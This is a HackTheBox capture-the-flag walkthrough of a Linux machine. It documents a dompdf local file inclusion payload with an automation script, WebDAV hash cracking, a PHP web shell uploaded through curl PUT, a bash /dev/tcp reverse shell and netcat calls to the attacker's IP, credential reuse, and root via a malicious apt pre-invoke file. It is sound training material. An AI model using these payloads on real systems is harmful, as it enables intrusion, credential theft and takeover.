HackTheBox
# Scan
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240331151311.png)

Web enumeration

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240331152859.png)
Inspecting the end of source code:
<!-- Todo: test dompdf on php 7.x -->

It mentions a dompdf technologie
Looking for vulnerabities with **searchsploit** we found a potential LFI vulnerability

Looking for a directory and it exists

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240331200225.png)
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240331200336.png)
Command line interface:
`php dompdf.php`
`php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>`

Web interface:

`http://example/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>`

# Exploiting Local File Intrution
[[DomPDF Exploitation - Local File Inclusion (LFI)]]
As dompdf.php is found in /dompdf folder. we change like this:
`http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd`

It generated a PDF with a base64 code what we can get in full by viewing the source:
`curl -s  -X GET "http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd" | grep -oP '\(.*?\)' | tail -n 1 | tr -d '()' | base64 -d` 

Other option is to use the filter changing *-* by *_*

`http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64_encode/resource=/etc/passwd`

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240331200827.png)
### Creating a script to automatize
`#!/bin/bash`

`#Colours`
`greenColour="\e[0;32m\033[1m"`
`endColour="\033[0m\e[0m"`
`redColour="\e[0;31m\033[1m"`
`blueColour="\e[0;34m\033[1m"`
`yellowColour="\e[0;33m\033[1m"`
`purpleColour="\e[0;35m\033[1m"`
`turquoiseColour="\e[0;36m\033[1m"`
`grayColour="\e[0;37m\033[1m"`

`function ctrl_c(){`
  `echo -e "\n\n${redColour}[!]Quitting...${endColour}\n"`
  `exit 1`
`}`

`#Ctrl+C`
`trap ctrl_c INT`

`while true; do`
  `echo -ne "${yellowColour}[${endColour}${blueColour}~${endColour}${yellowColour}]${endColour}${redColour} >${endColour} "&& read -r command`
  `echo`
  `curl -s  -X GET "http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=$command" | grep -oP '\(.*?\)' | tail -n 1 | tr -d '()' | base64 -d`
  `echo`
`done`

### Enumerating ports and possible rsa keys
/home/user/.ssh/id_rsa.pub *checking for keys*
/proc/net/tcp *see internal ports not open to us, it brings a hexadecimal code*

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401051048.png)
## Enumerating using Squid Proxy
![[SquidProxy Internal Enumeration]]
## Ennumerating Apache
![[Apache configuration files Enumeration]]

In this file, there are credentials that can be cracked by using john
`/var/www/html/webdav_test_inception/webdav.passwd` 
>`webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0`

this credentials were stored in a file *hash*

`john -w:$(locate rockyou.txt) hash`
>babygurl69       (webdav_tester)  

We can use this credentials on *webdav* path we found: /webdav_test_inception
However we don't have access
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401062832.png)
## WebDav Exploitation

Webdav is a share file application to use by web.
`davtest -url http://10.10.10.67/webdav_test_inception/ -auth webdav_tester:babygurl69`*it tests which files are accepted to be loaded by webdev*

In this case php files are accepted by using a PUT request

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401092323.png)

Loading a *cmd.php* file to inject commands:
<?php
	system($_REQUEST['cmd']);
?>

We can authenticate directly in the url to upload the file:
````
curl -s -X PUT http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/cmd.php -d @cmd.php
````

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401093215.png)
This upload the file as cmd.php and then we can execute the command:

http://10.10.10.67/webdav_test_inception/cmd.php?cmd=whoami

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401093341.png)

As it's possible to inject, we try to set a reverse shell:

`bash -c "bash -i >& /dev/tcp/10.10.14.70/4443 0>&1"`

In URL:
`bash -c "bash -i >%26 /dev/tcp/10.10.14.70/4443 0>%261"`

Creating a nc listening we don't get any shell so we can infer there are a firewall blocking port 4443

## Firewall Bypass
[[Firewall Bypass]]

If there is a firewall blocking ports, we can take advantage as we can inject code in the web site to create.
### Testing connection ports
Verifying that the web server has netcat:
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401104444.png)
Trying to get a message from port 4443 
whoami | nc 10.10.14.70 4443 *but there is not response*
by udp:
whoami | nc 10.10.14.70 -u 4443 *not yet*
### Creating a ForwardShell

![[Forward Shell]]

In the pseudo-terminal we can use a tty:
`script /dev/null -c  bash`

Browsing path */var/www* we found a *html* folder containing wolrdpress files

In *wp-config.php* we found Database credentials:
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401154657.png)
>root:VwPddNh7xMZyDQoByQL4

Even there is a mysql credential, there is not *mysql* installed in this machine.

By testing this credentials for user cobb found as a user before.
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401154945.png)

# Privilege Escalation

We can connect to cobb user by ssh with proxychains:

`proxychains ssh cobb@localhost`

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401160842.png)
As we are in sodo group, we can perform *sudo su* to be root in the container:

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401161002.png)
We can infer that machine IP is `192.168.0.1`, if this is not working, we can perform a hostDiscovy script.

## Port enumeration

````
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Quitting..\n"
	 tput cnorm; exit 1
}

#Ctrl+C
trap ctrl_c INT
 
tput civis
for port in $(seq 1 65565); do
	timeout 1 bash -c "echo '' > /dev/tcp/192.168.0.1/$port" 2>/dev/null && echo "[+] Port $port --open" &
done; wait
tput cnorm
````
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401162650.png)

We found 3 open ports.
## Exploiting FTP

As port 21 is open, we try to access as *anonymous* and we found some files
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401162858.png)
### Getting crontab file
![[Crontab file]]


In FTP connection, we don't have permission of *put* but we can try a connection by tftp getting access.
`tfpt 192.168.0.1`

Testing a test.txt file. put works, now we can create a payload to take advantage of the apt get cron configured
## Apt-get pre-invoke
![[Pre-invoke]]

If ssh connection fails, we can try using out forwardshell in order to try access by *tftp* and it works since it doesn't ask for credentials and *put* is allowed. Previously *malicious* file was uploaded with 
`curl -s -X PUT http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/malicious -d @malicious`

In **forwardshell.sh**
`tftp>` 
 `>put malicious /etc/apt/apt.conf.d/malicious`

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401174832.png)
Now we can wait for the the apt update cron to be executed.
Finnaly we've got root access

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401175635.png)

